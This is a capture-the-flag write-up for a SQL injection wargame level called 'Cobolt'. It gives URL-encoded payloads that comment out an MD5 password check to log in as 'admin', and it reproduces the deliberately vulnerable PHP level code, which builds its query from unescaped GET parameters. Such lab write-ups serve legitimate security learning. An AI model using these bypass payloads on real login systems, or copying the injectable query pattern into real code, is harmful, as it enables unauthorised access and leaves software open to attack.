# Lvl Cobolt

### **Vulnerability**

SQL injection with MD5 password check

### **Way to do it**

Comment out password check using proper SQL comment syntax

### **Restrictions**

- Same filters as Gremlin
- MD5 hashing on password
- Requires returning 'admin' specifically

### **Bypass Methods**

```
?id=admin%27--%20-

			or

?id=admin%27--%20
```

### **Important Notes**

> "I tried to use the previous level Payload but didn't work because sometimes it may fail if there is a quote after it... The SQL standards require that a single-line comment begins with -- and must be followed by a space or control character."
> 

> A **single-line comment** begins with `--` **and must be followed by a space or a control character** (like newline `\n`, carriage return `\r`, tab `\t`, etc.)
> 

> MD5 is a function used to **calculate the MD5 hash of a data value**. The hash will be returned as a hex encoded string.
> 

### **Level Code**

```
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>";
  highlight_file(__FILE__);
?>
```